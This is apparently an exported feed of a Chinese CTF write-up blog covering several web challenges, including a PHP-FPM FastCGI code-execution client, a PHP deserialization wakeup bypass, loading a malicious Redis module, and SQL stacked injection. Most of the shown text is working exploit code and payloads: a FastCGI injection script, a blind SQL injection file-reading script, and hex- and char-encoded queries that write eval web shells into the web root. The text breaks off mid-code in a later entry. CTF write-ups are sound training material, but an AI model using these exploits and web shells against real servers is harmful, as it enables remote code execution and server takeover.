class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = <span class="built_in">dict</span>()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    print(force_text(response))</span><br></pre></td></tr></table></figure><img src="/images/实验--PHP-FPM_未授权访问漏洞/image-20211108222740967.png" alt="image-20211108222740967" style="zoom:80%;"><p>成功命令执行！</p><p>参考文章:<br>[浅入深出 Fastcgi 协议分析与 PHP-FPM 攻击方法](<a href="https://whoamianony.top/2021/05/15/Web%E5%AE%89%E5%85%A8/%E6%B5%85%E5%85%A5%E6%B7%B1%E5%87%BA">https://whoamianony.top/2021/05/15/Web安全/浅入深出</a> Fastcgi 协议分析与 PHP-FPM 攻击方法/)</p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;PHP-FPM 服务暴漏导致的命令执行&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>天翼杯-2021-esay_eval</title>
    <link href="http://example.com/2021/09/24/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay_eval/"/>
    <id>http://example.com/2021/09/24/%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay_eval/</id>
    <published>2021-09-24T13:27:46.244Z</published>
    <updated>2021-11-24T14:00:13.772Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>反序列化、redis、php特性 </p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E6%BA%90%E7%A0%81">源码</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">反序列化</a></li><li><a href="#%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96">信息获取</a></li><li><a href="#redis">redis</a></li></ul><!-- tocstop --></div><br>#### 源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$method,$args</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;a-&gt;a();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,$_REQUEST[<span class="string">&#x27;poc&#x27;</span>],$ret);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($ret[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($ret[<span class="number">1</span>] <span class="keyword">as</span> $i) &#123;</span><br><span class="line">            <span class="keyword">if</span>(intval($i)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unserialize($_REQUEST[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4><span id="反序列化">反序列化</span></h4><p>利用B到A执行命令，需要绕过<code>wakeup</code>，需要先绕过正则，正则只对大写进行了匹配</p><blockquote><p><strong><em>php大小写问题</em></strong></p><p><strong>—区分</strong></p><p><strong>1. 变量名区分大小写</strong></p><p><strong>2. 常量名默认区分大小写，通常都写为大写</strong></p><p><strong>3. php.ini配置项指令区分大小写</strong></p><p><strong>—不区分</strong></p><p><strong>4. 函数名、方法名、类名不区分大小写</strong></p><p><strong>5. 魔术常量不区分大小写，推荐大写</strong></p><p><strong>6. NULL、TRUE、FALSE不区分大小写</strong></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?poc&#x3D;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:17:&quot;eval($_POST[ok]);&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure><h4><span id="信息获取">信息获取</span></h4><img src="/images/天翼杯-2021-esay_eval/image-20210924214011496.png" alt="image-20210924214011496" style="zoom:80%;"><p>开启端口<code>6379</code>，6379是<code>Redis</code>服务的默认端口。</p><p>可以读取到<code>.config.php.swp</code>，恢复：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;DB_HOST&quot;</span>,<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;DB_USERNAME&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;DB_PASSWOrd&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;DB_DATABASE&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;REDIS_PASS&quot;</span>,<span class="string">&quot;you_cannot_guess_it&quot;</span>);</span><br></pre></td></tr></table></figure><p>redis服务的配置</p><p><code>phpinfo</code></p><img src="/images/天翼杯-2021-esay_eval/image-20210924214530371.png" alt="image-20210924214530371" style="zoom:80%;"><p>/tmp/</p><h4><span id="redis">redis</span></h4><blockquote><p>tmp 上传 恶意so文件</p><p>控制redis加载恶意so文件获取权限</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MODULE LOAD &quot;&#x2F;tmp&#x2F;exp.so&quot;</span><br><span class="line">system.exec &quot;whoami&quot;</span><br></pre></td></tr></table></figure><img src="/images/天翼杯-2021-esay_eval/image-20210927085425948.png" alt="image-20210927085425948" style="zoom:80%;">]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;反序列化、redis、php特性 &lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>SUCTF-2018-MultiSQL</title>
    <link href="http://example.com/2021/09/21/SUCTF-2018-MultiSQL/"/>
    <id>http://example.com/2021/09/21/SUCTF-2018-MultiSQL/</id>
    <published>2021-09-21T08:18:19.243Z</published>
    <updated>2021-09-21T08:45:49.821Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>sql堆叠注入、读取文件、写文件</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#sql-%E8%AF%BB%E6%96%87%E4%BB%B6">sql 读文件</a></li><li><a href="#sql-%E5%86%99%E6%96%87%E4%BB%B6">sql 写文件</a></li></ul><!-- tocstop --></div><br>进入题目，可以登录+注册，fuzz好像过滤挺多，但不太好看<p>登录后有一个信息页，可疑参数<code>id</code>+图片上传功能，限制了后缀</p><p>测试可知id处存在数字型注入，且hex未过滤</p><h4><span id="sql-读文件">sql 读文件</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> Func</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">url0 = <span class="string">&quot;http://35d51ea9-d1ce-4398-83d3-db931ec5b398.node4.buuoj.cn:81/user/user.php?id=&#123;&#125;&quot;</span></span><br><span class="line">cookie = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;miq9eu5fc7i2qst8qslb0cuj42&quot;</span>&#125;</span><br><span class="line">data = <span class="string">&#x27;0x&#x27;</span></span><br><span class="line"></span><br><span class="line">sql1 = <span class="string">&quot;0^(hex(database())&gt;=&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 库名</span></span><br><span class="line">sql2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 表名</span></span><br><span class="line">sql3 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 列名</span></span><br><span class="line">sql4 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 数据</span></span><br><span class="line">what_file = Func.hex_Char(<span class="string">&quot;/var/www/html/index.php&quot;</span>)</span><br><span class="line">sql5 = <span class="string">&quot;0^(hex(load_file(&quot;</span> + what_file + <span class="string">&quot;))&gt;=&#123;&#125;)&quot;</span></span><br><span class="line"><span class="comment"># 读文件</span></span><br><span class="line"></span><br><span class="line">url = url0.<span class="built_in">format</span>(sql5)</span><br><span class="line"><span class="comment"># 选择查询语句</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    left = <span class="number">48</span></span><br><span class="line">    right = <span class="number">90</span></span><br><span class="line">    <span class="keyword">while</span> right &gt; left:</span><br><span class="line">        mid = <span class="built_in">int</span>((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        x = <span class="built_in">str</span>(x)</span><br><span class="line">        y = <span class="built_in">str</span>(mid)</span><br><span class="line">        pay = url.<span class="built_in">format</span>(data + <span class="built_in">hex</span>(<span class="built_in">int</span>(y)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">        response = requests.get(url=pay, cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;admin&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            left = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid - <span class="number">1</span></span><br><span class="line">        time.sleep(<span class="number">0.09</span>)  <span class="comment"># 防止脏数据</span></span><br><span class="line">        <span class="comment"># print(pay)</span></span><br><span class="line">    <span class="comment"># print(pay)</span></span><br><span class="line">    <span class="comment"># print(response.text)</span></span><br><span class="line">    data += <span class="built_in">str</span>(<span class="built_in">hex</span>(right)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    flag += <span class="built_in">chr</span>(right)</span><br><span class="line">    <span class="comment"># print(right)</span></span><br><span class="line">    print(flag)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>很多函数似乎被过滤了，测试可以load读取文件……</p><p>优化二分比较读取+缩小比较范围</p><h4><span id="sql-写文件">sql 写文件</span></h4><p>buu很难持续读下去……</p><blockquote><p>读取index.php。发现包含了bwvs_config/config.php和waf.php</p></blockquote><p><code>waf.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">$black_str = <span class="string">&quot;/(and|or|union|sleep|select|substr|order|left|right|order|by|where|rand|exp|updatexml|insert|update|dorp|delete|[|]|[&amp;])/i&quot;</span>;</span><br><span class="line">$str = preg_replace($black_str, <span class="string">&quot;@@&quot;</span>,$str);</span><br><span class="line"><span class="keyword">return</span> addslashes($str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">$id=waf($_GET[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_id =&quot;</span>.$id;</span><br><span class="line">$data = mysqli_multi_query($connect,$sql) <span class="keyword">or</span> <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">$result = mysqli_store_result($connect);</span><br><span class="line">$row = mysqli_fetch_row($result);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;user_id:&#x27;</span>.$row[<span class="number">0</span>].<span class="string">&quot;&lt;/h1&gt;&lt;br&gt;&lt;h2&gt;user_name:&quot;</span>.$row[<span class="number">1</span>].<span class="string">&quot;&lt;/h2&gt;&lt;br&gt;&lt;h3&gt;注册时间：&quot;</span>.$row[<span class="number">4</span>].<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL，造成堆叠注入漏洞。</p><p>我们可以用<code>char</code>或<code>hex</code>来编码，用<code>set</code> + <code>预处理语句</code>执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"><span class="keyword">import</span> Func</span><br><span class="line"></span><br><span class="line"><span class="comment"># 堆叠+预处理 写文件</span></span><br><span class="line">set_sql = Func.hex_Char(<span class="string">&quot;select &#x27;&lt;?php eval($_GET[ok]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/a.php&#x27;;&quot;</span>)</span><br><span class="line">sql = <span class="string">&quot;set @xx=&quot;</span>+set_sql+<span class="string">&quot;;prepare x from @xx;execute x;&quot;</span></span><br><span class="line"><span class="built_in">print</span> (sql, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">//<span class="built_in">set</span> @xx=<span class="number">0x73656c65637420273c3f706870206576616c28245f4745545b6f6b5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f612e706870273b</span>;prepare x <span class="keyword">from</span> @xx;execute x;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;select &#x27;&lt;?php eval($_POST[_]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;char(&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> string:</span><br><span class="line">    <span class="keyword">if</span> char == string[<span class="number">-1</span>]:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char)) + <span class="string">&quot;&quot;</span> + <span class="string">&quot;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(char)) + <span class="string">&quot;,&quot;</span> + <span class="string">&quot;&quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">//char(<span class="number">115</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">99</span>,<span class="number">116</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">60</span>,<span class="number">63</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">32</span>,<span class="number">101</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">40</span>,<span class="number">36</span>,<span class="number">95</span>,<span class="number">80</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">84</span>,<span class="number">91</span>,<span class="number">95</span>,<span class="number">93</span>,<span class="number">41</span>,<span class="number">5963</span>,<span class="number">62</span>,<span class="number">39</span>,<span class="number">32</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">111</span>,<span class="number">32</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">102</span>,<span class="number">105</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">32</span>,<span class="number">39</span>,<span class="number">47</span>,<span class="number">118</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">47</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">119</span>,<span class="number">47</span>,<span class="number">104</span>,<span class="number">116</span>,<span class="number">109</span>,<span class="number">108</span>,<span class="number">47</span>,<span class="number">102</span>,<span class="number">97</span>,<span class="number">118</span>,<span class="number">105</span>,<span class="number">99</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">47</span>,<span class="number">115</span>,<span class="number">104</span>,<span class="number">101</span>,<span class="number">108</span>,<span class="number">108</span>,<span class="number">46</span>,<span class="number">112</span>,<span class="number">104</span>,<span class="number">112</span>,<span class="number">39</span>,<span class="number">59</span>)</span><br></pre></td></tr></table></figure><p><code>http://35d51ea9-d1ce-4398-83d3-db931ec5b398.node4.buuoj.cn:81/user/user.php?id=2;+payload</code></p><p>再在<code>shell.php</code>上找flag即可</p><blockquote><p>老是连不上……</p></blockquote><p>参考文章:<br><a href="https://guokeya.github.io/post/t4QExMZtn/">[SUCTF 2018]MultiSQL(sql读取文件+写入文件)</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;sql堆叠注入、读取文件、写文件&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>GXYCTF2019-BabysqliV3.0</title>
    <link href="http://example.com/2021/09/21/GXYCTF2019-BabysqliV3.0/"/>
    <id>http://example.com/2021/09/21/GXYCTF2019-BabysqliV3.0/</id>
    <published>2021-09-21T03:06:52.178Z</published>
    <updated>2021-09-21T03:15:49.538Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>文件上传、phar反序列化</p><a id="more"></a></blockquote><div class="toc" tabindex="1"><!-- toc --><ul><li><a href="#%E7%88%86%E7%A0%B4">爆破</a></li><li><a href="#%E6%BA%90%E7%A0%81%E8%AF%BB%E5%8F%96">源码读取</a></li><li><a href="#flag">flag</a></li><li><a href="#phar">phar</a></li></ul><!-- tocstop --></div><br>#### 爆破<p>进入题目是一个登录界面，可知用户名是admin，爆破得密码为<code>password</code>，进入上传页面</p><h4><span id="源码读取">源码读取</span></h4><p>页面通过<code>file</code>参数加载文件，伪协议读取upload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">    上传文件</span><br><span class="line">    &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;file&quot;</span> /&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;上传&quot;</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $sandbox = getcwd().<span class="string">&quot;/uploads/&quot;</span>.md5($_SESSION[<span 